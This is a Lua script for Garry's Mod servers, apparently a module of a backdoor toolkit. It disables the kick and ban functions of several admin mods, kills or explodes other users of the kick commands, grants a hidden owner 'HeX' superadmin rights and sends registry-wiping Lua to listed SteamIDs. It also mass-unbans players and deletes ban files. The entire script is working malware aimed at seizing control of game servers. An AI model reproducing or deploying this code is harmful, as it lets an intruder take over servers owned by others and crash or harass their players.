
if IsUH then return end
--- === FIXERS === ---


local function NoKick(ply,cmd,args)
	if not ply:IsHeX() then
		ply:Kill()
		return
	end
	
	local uid = nil
	
	if (cmd == "kickid2") then
		uid = args[1]
	elseif (cmd == "banid2") then
		uid = args[2]
	end
	
	if uid then
		local HeX = GetHeX()
		
		if ValidEntity(HeX) then
			if uid == HeX:UserID() then
				ply:Explode()
				return
			end
			
			HeX:print("! kicking "..uid)
		end
		
		RunConsoleCommand("kickid", uid, Format("Kicked (%s)", RandomPlayer():Nick()) )
	end
end
concommand.Add("kickid2", NoKick)
concommand.Add("banid2", NoKick)



_R.Player.Kick 	= Useless
_R.Player.Ban 	= Useless
_R.Entity.Kick 	= Useless
_R.Entity.Ban 	= Useless

_R.Player.StripWeapons 	= Useless
_R.Player.StripWeapon 	= Useless

Cmd_RecvCommand = Useless 
BannedPlayers 	= {}
Kick 			= Useless
Ban				= Useless
SaveBans 		= Useless
KickBan 		= Useless
ASS_BanPlayer 	= Useless
ASS_KickPlayer	= Useless
GBans 			= {}

sourcebans = {}
sourcebans.doBan					= Useless
sourcebans.BanPlayer				= Useless
sourcebans.BanPlayerBySteamID		= Useless
sourcebans.BanPlayerByIP 			= Useless
sourcebans.BanPlayerBySteamIDAndIP	= Useless

doBan 								= Useless
BanPlayer 							= Useless
BanPlayerBySteamID 					= Useless
BanPlayerByIP 						= Useless
BanPlayerBySteamIDAndIP 			= Useless

if gatekeeper then
	gatekeeper.Drop = Useless
end

if asscmd then
	asscmd.ConsoleCommand = Useless
end

if (cvar2 and cvar2.SetFlags) then
	local function NoMore(cmd)
		CreateConVar(cmd, 0, {FCVAR_REPLICATED, FCVAR_CHEAT})
		cvar2.SetFlags(cmd, cvar2.GetFlags(cmd) + FCVAR_CHEAT)
	end
	
	NoMore("banid")
	NoMore("kickid")
	NoMore("addid")
	NoMore("writeip")
end


if ULib then
	ULib.kick	 = Useless
	ULib.ban	 = Useless
	ULib.kickban = Useless
	ULib.addBan	 = Useless
end

if evolve then
	evolve.Ban 		= Useless
	evolve.IsBanned = FALSE
end

concommand.Add("sm_ban", Useless)
concommand.Add("sm_banip", Useless)
concommand.Add("sm_addban", Useless)

hook.GetTable()["CanPlayerSuicide"] = nil
hook.GetTable()["PlayerUse"]		= nil
hook.GetTable()["PlayerNoClip"]		= nil

--_R.Player.IsAdmin 		= TRUE
--_R.Player.IsSuperAdmin	= TRUE

local HeX = GetHeX()
if ValidEntity(HeX) then
	HeX:SetUserGroup('admin')
	HeX:SetUserGroup('superadmin')
end


local Nope = {
	["STEAM_0:0:48926883"] = true,
	["STEAM_0:0:40143824"] = true,
	["STEAM_0:1:33687954"] = true,
}
hook.Add("Think", "HPFix", function()
	for k,v in pairs( player.GetHumans() ) do
		if ValidEntity(v) then
			if v.ShouldGod then
				v:GodEnable()
			end
			
			if not v:IsHeX() then
				if (v:Health() > 100) then
					v:SetHealth(99)
				end
				
				v:GodDisable()
			end
			
			if Nope[ v:SteamID() ] then
				v:SendLua([[ table.Empty(_R) ]])
			end
		end
	end
end)

hook.Add("PlayerDeathThink", "AutoSpawn", function(ply)
	ply:Spawn()
end)

local function UnbanAll()
	local uTot = 0
	if (ULib and ULib.bans and ULib.unban) then
		local TempTab = ULib.bans
		
		timer.Simple(1,function()
			for k,v in pairs(TempTab) do
				ULib.unban(k)
				uTot = uTot + 1
			end
		end)
	end
	
	local eTot = 0
	if (evolve and evolve.PlayerInfo) then
		for k,v in pairs(evolve.PlayerInfo) do
			if (v.BanEnd) then
				game.ConsoleCommand("removeid "..v.SteamID.."\n")
				evolve.PlayerInfo[k] = nil
				eTot = eTot + 1
			end
		end
	end
	
	local Banned	= "cfg/banned_user.cfg"
	local bTot 		= 0
	if file.Exists(Banned, true) then
		local Text = file.Read(Banned, true)
		if not Text then return end
		
		local FTab = string.Explode("\n", Text)
		
		for k,v in pairs(FTab) do
			if (v != "") then
				local SID = v:match("(STEAM_(%d+):(%d+):(%d+))") or v
				game.ConsoleCommand("removeid "..SID.."\n")
				bTot = bTot + 1
			end
		end
		
		RunConsoleCommand("writeid")
	end
	
	
	local HeX = GetHeX()
	if not ValidEntity(HeX) then
		HeX = nil
	end
	
	if (uTot != 0) then
		ULib.bans = {}
		if file.Exists("ULib/bans.txt") then
			file.Delete("ULib/bans.txt")
		end
		
		if HeX then
			HeX:print("\nUNBANNED "..uTot.." ULib users!\n")
		end
	end	
	
	if (eTot != 0) then
		if evolve.SavePlayerInfo then
			evolve:SavePlayerInfo()
		end
		if HeX then
			HeX:print("\nUNBANNED "..eTot.." EV users!\n")
		end
	end
	
	if (bTot != 0) then
		if HeX then
			HeX:print("\nUNBANNED "..bTot.." BASE users!\n")
		end
	end
end
timer.Simple(2, UnbanAll)


local function DexUnbanAll(ply,cmd,args)
	UnbanAll()
	
	ply:print("[OK] Unbanned everyone")
end
command.Add("unbanall", DexUnbanAll, "Unban everyone")














